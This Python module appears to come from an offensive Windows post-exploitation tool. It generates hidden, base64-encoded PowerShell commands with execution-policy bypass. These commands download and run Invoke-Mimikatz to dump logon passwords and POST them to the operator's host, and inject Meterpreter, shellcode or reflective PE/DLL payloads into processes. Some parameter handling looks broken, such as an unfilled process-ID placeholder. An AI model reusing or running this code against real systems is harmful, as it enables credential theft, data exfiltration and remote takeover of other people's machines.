from base64 import b64encode

import settings

"""
    --> https://www.youtube.com/watch?v=nm6DO_7px1I <--
                    I GOT THE POWAH!
"""

def ps_command(command):
    if settings.args.server == 'https':
        command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + command

    if settings.args.force_ps32:
        command = 'IEX "$Env:windir\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}"'.format(b64encode(command.encode('UTF-16LE')))

    base64_command = b64encode(command.encode('UTF-16LE'))

    ps_command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64_command)

    return ps_command

def gen_mimikatz_command(localip, katz_command='privilege::debug sekurlsa::logonpasswords exit'):

    protocol = settings.args.server
    if settings.args.server == 'smb':
        protocol = 'file'

    command = "IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/tmp/Invoke-Mimikatz.ps1');\
$creds = Invoke-Mimikatz -Command '{katz_command}';\
$request = [System.Net.WebRequest]::Create('{protocol}://{addr}/tmp');\
$request.Method = 'POST';\
$request.ContentType = 'application/x-www-form-urlencoded';\
$bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);\
$request.ContentLength = $bytes.Length;\
$requestStream = $request.GetRequestStream();\
$requestStream.Write( $bytes, 0, $bytes.Length );\
$requestStream.Close();\
$request.GetResponse();".format(protocol=protocol, addr=localip, katz_command=katz_command)

    return ps_command(command)

def inject_pscommand(localip):

    protocol = settings.args.server
    if settings.args.server == 'smb':
        protocol = 'file'

    if settings.args.inject.startswith('met_'):
        command = "IEX (New-Object Net.WebClient).DownloadString('{}://{}/TMP/Invoke-Shellcode.ps1');\
Invoke-Shellcode -Force -Payload windows/meterpreter/{} -Lhost {} -Lport {}".format(protocol,
                                                                                  localip,
                                                                                  settings.args.inject[4:], 
                                                                                  settings.args.met_options[0], 
                                                                                  settings.args.met_options[1])
        if settings.args.procid:
            command += " -ProcessID {}".format(settings.args.procid)

        command += ';'

    elif settings.args.inject == 'shellcode':
        command = "IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/tmp/Invoke-Shellcode.ps1');\
$WebClient = New-Object System.Net.WebClient;\
[Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}/tmp2/{shellcode}');\
Invoke-Shellcode -Force -Shellcode $bytes".format(protocol=protocol,
                                                 addr=localip,
                                                 shellcode=settings.args.path.split('/')[-1])

        if settings.args.procid:
            command += " -ProcessID {}".format(settings.args.procid)

        command += ';'

    elif settings.args.inject == 'exe' or settings.args.inject == 'dll':
        command = "IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/tmp/Invoke-ReflectivePEInjection.ps1');\
Invoke-ReflectivePEInjection -PEUrl {protocol}://{addr}/tmp2/{pefile}".format(protocol=protocol,
                                                                             addr=localip,
                                                                             pefile=settings.args.path.split('/')[-1])

        if settings.args.procid:
            command += " -ProcID {}"

        if settings.args.inject == 'exe' and settings.args.exesettings.args:
            command += " -Exesettings.args \"{}\"".format(settings.args.exesettings.args)

        command += ';'

    return ps_command(command)
